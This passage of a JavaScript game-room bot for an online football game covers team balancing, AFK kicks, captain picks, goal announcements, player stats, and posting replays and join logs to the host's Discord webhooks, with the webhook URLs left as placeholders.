F8F8F8","bCoef":0.1,"trait":"line"},{"v0":69,"v1":68,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":70,"v1":71,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":67,"v1":71,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":73,"v1":72,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":74,"v1":75,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":76,"v1":77,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":78,"v1":79,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":80,"v1":81,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":82,"v1":83,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":84,"v1":85,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":86,"v1":87,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":89,"v1":88,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":91,"v1":90,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":92,"v1":93,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":94,"v1":95,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":96,"v1":97,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":390},{"v0":99,"v1":98,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":98,"v1":99,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":101,"v1":100,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":100,"v1":101,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":103,"v1":102,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":102,"v1":103,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":105,"v1":104,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":104,"v1":105,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":107,"v1":106,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":106,"v1":107,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":109,"v1":108,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":108,"v1":109,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":111,"v1":110,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":110,"v1":111,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":113,"v1":112,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":112,"v1":113,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":115,"v1":114,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":114,"v1":115,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":117,"v1":116,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":116,"v1":117,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":119,"v1":118,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":118,"v1":119,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":121,"v1":120,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":120,"v1":121,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":123,"v1":122,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":122,"v1":123,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":125,"v1":124,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":124,"v1":125,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":127,"v1":126,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":126,"v1":127,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":129,"v1":128,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":128,"v1":129,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5}],"goals":[{"p0":[-557.5,-80],"p1":[-557.5,80],"team":"red"},{"p0":[557.5,80],"p1":[557.5,-80],"team":"blue"}],"discs":[{"radius":5,"pos":[-550,80],"color":"FF6666","trait":"goalPost","y":80},{"radius":5,"pos":[-550,-80],"color":"FF6666","trait":"goalPost","y":-80,"x":-560},{"radius":5,"pos":[550,80],"color":"6666FF","trait":"goalPost","y":80},{"radius":5,"pos":[550,-80],"color":"6666FF","trait":"goalPost","y":-80},{"radius":3,"invMass":0,"pos":[-550,240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[-550,-240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[550,-240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[550,240],"color":"FFCC00","bCoef":0.1,"trait":"line"}],"planes":[{"normal":[0,1],"dist":-240,"bCoef":1,"trait":"ballArea","vis":false,"curve":0},{"normal":[0,-1],"dist":-240,"bCoef":1,"trait":"ballArea"},{"normal":[0,1],"dist":-270,"bCoef":0.1},{"normal":[0,-1],"dist":-270,"bCoef":0.1},{"normal":[1,0],"dist":-620,"bCoef":0.1},{"normal":[-1,0],"dist":-620,"bCoef":0.1},{"normal":[1,0],"dist":-620,"bCoef":0.1,"trait":"ballArea","vis":false,"curve":0},{"normal":[-1,0],"dist":-620,"bCoef":0.1,"trait":"ballArea","vis":false,"curve":0}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":0.5},"goalNet":{"vis":true,"bCoef":0.1,"cMask":["ball"]},"line":{"vis":true,"bCoef":0.1,"cMask":[""]},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]}},"playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":5},"ballPhysics":{"radius":6.25,"bCoef":0.4,"invMass":1.5,"damping":0.99,"color":"FFCC00"}}'; // Read above

	/* OPTIONS */

	var afkLimit = 12;
	var drawTimeLimit = Infinity;
	var maxTeamSize = 3; // This works for 1 (you might want to adapt things to remove some useless stats in 1v1 like assist or cs), 2, 3 or 4
	var slowMode = 0;

	/* PLAYERS */

	const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
	var extendedP = [];
	const eP = { ID: 0, AUTH: 1, CONN: 2, AFK: 3, ACT: 4, GK: 5, MUTE: 6 };
	const Ss = { GA: 0, WI: 1, DR: 2, LS: 3, WR: 4, GL: 5, AS: 6, GK: 7, CS: 8, CP: 9, RL: 10, NK: 11}
	var players;
	var teamR;
	var teamB;
	var teamS;

	/* GAME */

	var lastTeamTouched;
	var lastPlayersTouched; // These allow to get good goal notifications (it should be lastPlayersKicked, waiting on a next update to get better track of shots on target)
	var countAFK = false; // Created to get better track of activity
	var activePlay = false; // Created to get better track of the possession
	var goldenGoal = false;
	var SMSet = new Set(); // Set created to get slow mode which is useful in chooseMode
	var banList = []; // Getting track of the bans, so we can unban ppl if we want
	
	/* STATS */

	var game;
	var GKList = ["",""];
	var Rposs = 0;
	var Bposs = 0;
	var point = [{"x": 0, "y": 0}, {"x": 0, "y": 0}]; // created to get ball speed
	var ballSpeed;
	var vcgbsdbf = 7865;
	var lastWinner = Team.SPECTATORS;
	var streak = 0;
	var allBlues = []; // This is to count the players who should be counted for the stats. This includes players who left after the game has started, doesn't include those who came too late or ...
	var allReds = []; // ... those who came in a very unequal game.

	/* BALANCE & CHOOSE */

	var inChooseMode = false; // This variable enables to distinguish the 2 phases of playing and choosing which should be dealt with very differently
	var redCaptainChoice = "";
	var blueCaptainChoice = "";
	var chooseTime = 20;
	var timeOutCap;

	/* AUXILIARY */

	var checkTimeVariable = false; // This is created so the chat doesn't get spammed when a game is ending via timeLimit
	var statNumber = 0; // This allows the room to be given stat information every X minutes
	var endGameVariable = true; // This variable with the one below helps distinguish the cases where games are stopped because they have finished to the ones where games are stopped due to player movements or resetting teams
	var resettingTeams = false;
	var capLeft = false;
	var statInterval = 6;

	loadMap(aloneMap, 0, 0);

	/* OBJECTS */

	function Goal(time, team, striker, assist) {
		this.time = time;
		this.team = team;
		this.striker = striker;
		this.assist = assist;
	}

	function Game(date, scores, goals) {
		this.date = date;
		this.scores = scores;
		this.goals = goals;
	}

	const frasesGOL = [" Look at this goal by ", " It's GOOOOOOL from ", " What a goal by "]; // Goal phrases
	const frasesASS = [" with the beautiful pass of ", " accompanied by the beautiful pass of "]; // Phrases of assists
	const golcontra = [" I'm sure it was unintentional right, ", " Well, this time it was on purpose, ", " It's GOOOOOL against "]; // Goal against phrases
	
	const goleiro = [" it's a man? no, it's a barrier! ", " don't let one pass ", " is the best GK in the world? "]; // Goalkeeper phrases

	const replaysdiscord = "CHANGEWEBHOOK_REPLAY";

	function getDate(){
	let data = new Date(),
	dia=data.getDate().toString().padStart(2, '0'),
	mes=(data.getMonth()+1).toString().padStart(2, '0'),
	ano=data.getFullYear(),
	horas=data.getHours().toString().padStart(2, '0'),
	minutos=data.getMinutes().toString().padStart(2, '0');
	segundos=data.getSeconds().toString().padStart(2, '0');
	return `${dia}${minutos}${segundos}`;
	}
	
	function sendDiscordWebhook(scores){
		const form = new FormData();
		form.append(
			"file",
			new File([room.stopRecording()],
				`${getDate()}.hbr2`,
				{type: "text/plain"}
				)
			);
	
		const webhook = new XMLHttpRequest();
		webhook.open("POST", replaysdiscord);
		webhook.send(form);
	}
	/* FUNCTIONS */

	/* AUXILIARY FUNCTIONS */

	function sendAnnouncementToDiscord(message) {

		var request = new XMLHttpRequest();
		request.open("POST","CHANGEWEBHOOK_JOIN_PLAYER"); //sends a log with information about users who connect
	
		request.setRequestHeader('Content-type', 'application/json');
	
		var params = {
			avatar_url: '',
			username: 'LOG',
			content: message
		};
	
		request.send(JSON.stringify(params));
	}

	function getRandomInt(max) { // returns a random number from 0 to max-1
		return Math.floor(Math.random() * Math.floor(max)); 
	}

	function getTime(scores) { // returns the current time of the game
		return "[" + Math.floor(Math.floor(scores.time/60)/10).toString() + Math.floor(Math.floor(scores.time/60)%10).toString() + ":" + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))/10).toString() + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))%10).toString() + "]"
	}

	function pointDistance(p1, p2) {
		var d1 = p1.x - p2.x;
		var d2 = p1.y - p2.y;
		return Math.sqrt(d1 * d1 + d2 * d2);
	}

	/* BUTTONS */

	function topBtn() {
		if (teamS.length == 0) {
			return;
		}
		else {
			if (teamR.length == teamB.length) {
				if (teamS.length > 1) {
					room.setPlayerTeam(teamS[0].id, Team.RED);
					room.setPlayerTeam(teamS[1].id, Team.BLUE);
				}
				return;
			}
			else if (teamR.length < teamB.length) {
				room.setPlayerTeam(teamS[0].id, Team.RED);
			}
			else {
				room.setPlayerTeam(teamS[0].id, Team.BLUE);
			}
		}
	}

	function randomBtn() {
		if (teamS.length == 0) {
			return;
		}
		else {
			if (teamR.length == teamB.length) {
				if (teamS.length > 1) {
					var r = getRandomInt(teamS.length);
					room.setPlayerTeam(teamS[r].id, Team.RED);
					teamS = teamS.filter((spec) => spec.id != teamS[r].id);
					room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
				}
				return;
			}
			else if (teamR.length < teamB.length) {
				room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED);
			}
			else {
				room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
			}
		}
	}

	function blueToSpecBtn() {
		resettingTeams = true;
		setTimeout(() => { resettingTeams = false; }, 100);
		for (var i = 0; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
		}
	}

	function redToSpecBtn() {
		resettingTeams = true;
		setTimeout(() => { resettingTeams = false; }, 100);
		for (var i = 0; i < teamR.length; i++) {
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
	}

	function resetBtn() {
		resettingTeams = true;
		setTimeout(() => { resettingTeams = false; }, 100);
		if (teamR.length <= teamB.length) {
			for (var i = 0; i < teamR.length; i++) {
				room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
				room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
			}
			for (var i = teamR.length; i < teamB.length; i++) {
				room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			}
		}
		else {
			for (var i = 0; i < teamB.length; i++) {
				room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
				room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
			}
			for (var i = teamB.length; i < teamR.length; i++) {
				room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
			}
		}
	}


	function blueToRedBtn() {
		resettingTeams = true;
		setTimeout(() => { resettingTeams = false; }, 100);
		for (var i = 0; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[i].id, Team.RED);
		}
	}

	/* GAME FUNCTIONS */

	function checkTime() {
		const scores = room.getScores();
		game.scores = scores;
		if (Math.abs(scores.time - scores.timeLimit) <= 0.01 && scores.timeLimit != 0) {
			if (scores.red != scores.blue) {
				if (checkTimeVariable == false) {
					checkTimeVariable = true;
					setTimeout(() => { checkTimeVariable = false; }, 3000);
					scores.red > scores.blue ? endGame(Team.RED) : endGame(Team.BLUE);
					setTimeout(() => { room.stopGame(); }, 2000);
				}
				return;
			}
			goldenGoal = true;
			room.sendChat("⏱️ Let's go, you wooden legs! The guys want to play");
		}
		if (Math.abs(drawTimeLimit * 60 - scores.time - 60) <= 0.01 && players.length > 2) {
			if (checkTimeVariable == false) {
				checkTimeVariable = true;
				setTimeout(() => { checkTimeVariable = false; }, 10);
				room.sendChat("⌛ Leaving ends..");
			}
		}
		if (Math.abs(scores.time - drawTimeLimit * 60) <= 0.01 && players.length > 2) {
			if (checkTimeVariable == false) {
				checkTimeVariable = true;
				setTimeout(() => { checkTimeVariable = false; }, 10);
				endGame(Team.SPECTATORS);
				room.stopGame();
				goldenGoal = false;
			}
		}
	}

	function endGame(winner) { // handles the end of a game : no stopGame function inside
		players.length >= 2 * maxTeamSize - 1 ? activateChooseMode() : null;
		const scores = room.getScores();
		game.scores = scores;
		Rposs = Rposs/(Rposs+Bposs);
		Bposs = 1 - Rposs;
		lastWinner = winner;
		endGameVariable = true;
		if (winner == Team.RED) {
			streak++;
			room.sendAnnouncement("🏆 Red team won! [" + scores.red + " - " + scores.blue + "] | Winning streak: " + streak + " 🏆", null, 0xFDC43A);
		}
		else if (winner == Team.BLUE) {
			streak = 1;
			room.sendAnnouncement("🏆 Blue team won! [" + scores.blue + " - " + scores.red + "] | Winning streak: " + streak + " 🏆", null, 0xFDC43A);
		}
		else {
			streak = 0;
			room.sendAnnouncement("💤 Timeout reached");
	    }
	    room.sendAnnouncement("📊 Ball possession: 🔴 " + (Rposs*100).toPrecision(3).toString() + "% | " + (Bposs*100).toPrecision(3).toString() + "% 🔵", null, 0xFDC43A);
	    scores.red == 0 ? (scores.blue == 0 ? room.sendAnnouncement("🥅 " + GKList[0].name + " it's a man? no, it's a barrier! " + GKList[1].name + " did not score. ", null, 0xFDC43A) : room.sendAnnouncement("🥅 it's a man? no, it's a barrier! " + GKList[1].name + " didn't concede a goal ", null, 0xFDC43A)) : scores.blue == 0 ? room.sendAnnouncement("🥅 it's a man? no, it's a barrier! " + GKList[0].name + " didn't concede a goal ", null, 0xFDC43A) : null;
		updateStats();
		sendDiscordWebhook(scores);
		room.sendAnnouncement("The match was recorded and sent on our Discord. ID: " + `${getDate()}`, null, Cor.Amrelo, Negrito);
		
	}

	function quickRestart() {
		room.stopGame();
		setTimeout(() => { room.startGame(); }, 2000);
	}

	function resumeGame() {
		setTimeout(() => { room.startGame(); }, 2000);
		setTimeout(() => { room.pauseGame(false); }, 1000);
	}

	function activateChooseMode() {
		inChooseMode = true;
		slowMode = 2;
		room.sendChat("🙋‍♂️ Recruitment mode started!");
	}

	function deactivateChooseMode() {
		inChooseMode = false;
		clearTimeout(timeOutCap);
		if (slowMode != 0) {
			slowMode = 0;
			room.sendChat("🙋‍♂️ Recruitment mode has ended.");
		}
		redCaptainChoice = "";
		blueCaptainChoice = "";
	}

	function loadMap(map, scoreLim, timeLim) {
		if (map == aloneMap) {
			room.setCustomStadium(aloneMap);
		}
		else if (map == classicMap) {
			(classicMap != '') ? room.setCustomStadium(classicMap) : room.setDefaultStadium("Classic");
		}
		else if (map == bigMap) {
			(bigMap != '.') ? room.setCustomStadium(bigMap) : room.setDefaultStadium("Big");
		}
		else {
			room.setCustomStadium(map);
		}
		room.setScoreLimit(scoreLim);
		room.setTimeLimit(timeLim);
	}

	/* PLAYER FUNCTIONS */

	function updateTeams() { // update the players' list and all the teams' list
		players = room.getPlayerList().filter((player) => player.id != 0 && !getAFK(player));
		teamR = players.filter(p => p.team === Team.RED);
		teamB = players.filter(p => p.team === Team.BLUE);
		teamS = players.filter(p => p.team === Team.SPECTATORS);
	}

	function handleInactivity() { // handles inactivity : players will be kicked after afkLimit
		if (countAFK && (teamR.length + teamB.length) > 1) {
			for (var i = 0; i < teamR.length ; i++) {
				setActivity(teamR[i], getActivity(teamR[i]) + 1);
			}
			for (var i = 0; i < teamB.length ; i++) {
				setActivity(teamB[i], getActivity(teamB[i]) + 1);
			}
		}
		for (var i = 0; i < extendedP.length ; i++) {
			if (extendedP[i][eP.ACT] == 60 * (2/3 * afkLimit)) {
				room.sendAnnouncement("[PV] ⛔ @" + room.getPlayer(extendedP[i][eP.ID]).name + ", if you don't move in the next " + Math.floor(afkLimit / 3) + " seconds, you will be kicked!", extendedP[i][eP.ID]);
			}
			if (extendedP[i][eP.ACT] >= 60 * afkLimit) {
				extendedP[i][eP.ACT] = 0;
				if (room.getScores().time <= afkLimit - 0.5) {
					setTimeout(() => { !inChooseMode ? quickRestart() : room.stopGame(); }, 10);
				}
				room.kickPlayer(extendedP[i][eP.ID], "AFK", false);
			}
		}
	}

	function getAuth(player) {
		return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AUTH] : null;
	}

	function getAFK(player) {
		return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AFK] : null;
	}

	function setAFK(player, value) {
		extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.AFK] = value);
	}

	function getActivity(player) {
		return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.ACT] : null;
	}

	function setActivity(player, value) {
		extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.ACT] = value);
	}

	function getGK(player) {
		return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.GK] : null;
	}

	function setGK(player, value) {
		extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.GK] = value);
	}

	function getMute(player) {
		return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.MUTE] : null;
	}

	function setMute(player, value) {
		extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.MUTE] = value);
	}

	/* BALANCE & CHOOSE FUNCTIONS */

	function updateRoleOnPlayerIn() {
		updateTeams();
		if (inChooseMode) {
			if (players.length == 6) {
				loadMap(bigMap, scoreLimitBig, timeLimitBig);
			}
			getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
		}
		balanceTeams();
	}

	function updateRoleOnPlayerOut() {
	    updateTeams();
		if (room.getScores() != null) {
			var scores = room.getScores();
			if (players.length >= 2 * maxTeamSize && scores.time >= (5/6) * game.scores.timeLimit && teamR.length != teamB.length) {
				if (teamR.length < teamB.length) {
					if (scores.blue - scores.red == 2) {
						endGame(Team.BLUE);
						room.sendChat("🤖 Ragequit detected. The game is over");
						setTimeout(() => { room.stopGame(); }, 100);
						return;
					}
				}
				else {
					if (scores.red - scores.blue == 2) {
						endGame(Team.RED);
						room.sendChat("🤖 Ragequit detected. The game is over");
						setTimeout(() => { room.stopGame(); }, 100);
						return;
					}
				}
			}
		}
		if (inChooseMode) {
			if (players.length == 5) {
				loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
			}
			if (teamR.length == 0 || teamB.length == 0) {
				teamR.length == 0 ? room.setPlayerTeam(teamS[0].id, Team.RED) : room.setPlayerTeam(teamS[0].id, Team.BLUE);
				return;
			}
			if (Math.abs(teamR.length - teamB.length) == teamS.length) {
				room.sendChat("🤖 No choices let me handle this situation");
				deactivateChooseMode();
				resumeGame();
				var b = teamS.length;
				if (teamR.length > teamB.length) {
					for (var i = 0 ; i < b ; i++) {
						setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 5*i);
					}
				}
				else {
					for (var i = 0 ; i < b ; i++) {
						setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 5*i);
					}
				}
				return;
			}
			if (streak == 0 && room.getScores() == null) {
				if (Math.abs(teamR.length - teamB.length) == 2) { // if someone left a team has 2 more players than the other one, put the last chosen guy back in his place so it's fair
					room.sendChat("🤖 Balancing teams...");
					teamR.length > teamB.length ? room.setPlayerTeam(teamR[teamR.length - 1].id, Team.SPECTATORS) : room.setPlayerTeam(teamB[teamB.length - 1].id, Team.SPECTATORS);
				}
			}
			if (teamR.length == teamB.length && teamS.length < 2) {
				deactivateChooseMode();
				resumeGame();
				return;
			}
			capLeft ? choosePlayer() : getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
		}
		balanceTeams();
	}

	function balanceTeams() {
		if (!inChooseMode) {
			if (players.length == 1 && teamR.length == 0) {
	            quickRestart();
	            loadMap(aloneMap, 0, 0);
				room.setPlayerTeam(players[0].id, Team.RED);
			}
			else if (Math.abs(teamR.length - teamB.length) == teamS.length && teamS.length > 0) {
				const n = Math.abs(teamR.length - teamB.length);
				if (players.length == 2) {
					quickRestart();
					loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
				}
				if (teamR.length > teamB.length) {
					for (var i = 0 ; i < n ; i++) {
						room.setPlayerTeam(teamS[i].id, Team.BLUE);
					}
				}
				else {
					for (var i = 0 ; i < n ; i++) {
						room.setPlayerTeam(teamS[i].id, Team.RED);
					}
				}
			}
			else if (Math.abs(teamR.length - teamB.length) > teamS.length) {
				const n = Math.abs(teamR.length - teamB.length);
				if (players.length == 1) {
					quickRestart();
					loadMap(aloneMap, 0, 0);
					room.setPlayerTeam(players[0].id, Team.RED);
					return;
				}
				else if (players.length == 5) {
					quickRestart();
					loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
				}
				if (players.length == maxTeamSize * 2 - 1) {
					allReds = [];
					allBlues = [];
				}
				if (teamR.length > teamB.length) {
					for (var i = 0 ; i < n ; i++) {
						room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
					}
				}
				else {
					for (var i = 0 ; i < n ; i++) {
						room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
					}
				}
			}
			else if (Math.abs(teamR.length - teamB.length) < teamS.length && teamR.length != teamB.length) {
				room.pauseGame(true);
				activateChooseMode();
				choosePlayer();
			}
			else if (teamS.length >= 2 && teamR.length == teamB.length && teamR.length < maxTeamSize) {
				if (teamR.length == 2) {
					quickRestart();
					loadMap(bigMap, scoreLimitBig, timeLimitBig);
				}
				topBtn();
			}
		}
	}

	function choosePlayer() {
		clearTimeout(timeOutCap);
		if (teamR.length <= teamB.length && teamR.length != 0) {
			room.sendChat("[PV] To choose a player, enter his number from the provided list or use'top', 'random' or 'bottom'.", teamR[0].id);
			timeOutCap = setTimeout(function (player) { room.sendChat("[PV] Hurry up @" + player.name + ", you have only " + Number.parseInt(chooseTime / 2) + " seconds left to choose!", player.id); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "You didn't choose in time!", false); }, chooseTime * 500, teamR[0]); }, chooseTime * 1000, teamR[0]);
		}
		else if (teamB.length < teamR.length && teamB.length != 0) {
			room.sendChat("[PV] To choose a player, enter his number from the provided list or use'top', 'random' or 'bottom'.", teamB[0].id);
			timeOutCap = setTimeout(function (player) { room.sendChat("[PV] Hurry up @" + player.name + ", you have only " + Number.parseInt(chooseTime / 2) + " seconds left to choose!", player.id); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "You didn't choose in time!", false); }, chooseTime * 500, teamB[0]); }, chooseTime * 1000, teamB[0]);
		}
		if (teamR.length != 0 && teamB.length != 0) getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}

	function getSpecList(player) {
		var cstm = "[PV] Players: ";
		for (var i = 0 ; i < teamS.length ; i++) {
			if (140 - cstm.length < (teamS[i].name + "[" + (i+1) + "], ").length) {
				room.sendChat(cstm, player.id);
				cstm = "... ";
			}
			cstm += teamS[i].name + "[" + (i+1) + "], ";
		}
		cstm = cstm.substring(0,cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}

	/* STATS FUNCTIONS */

	function getLastTouchOfTheBall() {
		const ballPosition = room.getBallPosition();
		updateTeams();
		for (var i = 0; i < players.length; i++) {
			if (players[i].position != null) {
				var distanceToBall = pointDistance(players[i].position, ballPosition);
				if (distanceToBall < triggerDistance) {
					!activePlay ? activePlay = true : null;
					if (lastTeamTouched == players[i].team && lastPlayersTouched[0] != null && lastPlayersTouched[0].id != players[i].id) {
						lastPlayersTouched[1] = lastPlayersTouched[0];
						lastPlayersTouched[0] = players[i];
					}
					lastTeamTouched = players[i].team;
				}
			}
		}
	}

	function getStats() { // gives possession, ball speed and GK of each team
		if (activePlay) {
			updateTeams();
			lastTeamTouched == Team.RED ? Rposs++ : Bposs++;
			var ballPosition = room.getBallPosition();
			point[1] = point[0];
			point[0] = ballPosition;
			ballSpeed = (pointDistance(point[0], point[1]) * 60 * 60 * 60)/15000;
			var k = [-1, Infinity];
			for (var i = 0; i < teamR.length; i++) {
				if (teamR[i].position.x < k[1]) {
					k[0] = teamR[i];
					k[1] = teamR[i].position.x;
				}
			}
			k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
			k = [-1, -Infinity];
			for (var i = 0; i < teamB.length; i++) {
				if (teamB[i].position.x > k[1]) {
					k[0] = teamB[i];
					k[1] = teamB[i].position.x;
				}
			}
			k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
			findGK();
		}
	}

	function updateStats() {
		if (players.length >= 2 * maxTeamSize && (game.scores.time >= (5 / 6) * game.scores.timeLimit || game.scores.red == game.scores.scoreLimit || game.scores.blue == game.scores.scoreLimit) && allReds.length >= maxTeamSize && allBlues.length >= maxTeamSize) {
			var stats;
			for (var i = 0; i < allReds.length; i++) {
				localStorage.getItem(getAuth(allReds[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allReds[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allReds[i].name];
				stats[Ss.GA]++;
				lastWinner == Team.RED ? stats[Ss.WI]++ : lastWinner == Team.BLUE ? stats[Ss.LS]++ : stats[Ss.DR]++;
				stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
				localStorage.setItem(getAuth(allReds[i]), JSON.stringify(stats));
			}
			for (var i = 0; i < allBlues.length; i++) {
				localStorage.getItem(getAuth(allBlues[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allBlues[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allBlues[i].name];
				stats[Ss.GA]++;
				lastWinner == Team.BLUE ? stats[Ss.WI]++ : lastWinner == Team.RED ? stats[Ss.LS]++ : stats[Ss.DR]++;
				stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
				localStorage.setItem(getAuth(allBlues[i]), JSON.stringify(stats));
			}
			for (var i = 0; i < game.goals.length; i++) {
				if (game.goals[i].striker != null) {
					if ((allBlues.concat(allReds)).findIndex((player) => player.id == game.goals[i].striker.id) != -1) {
						stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].striker)));
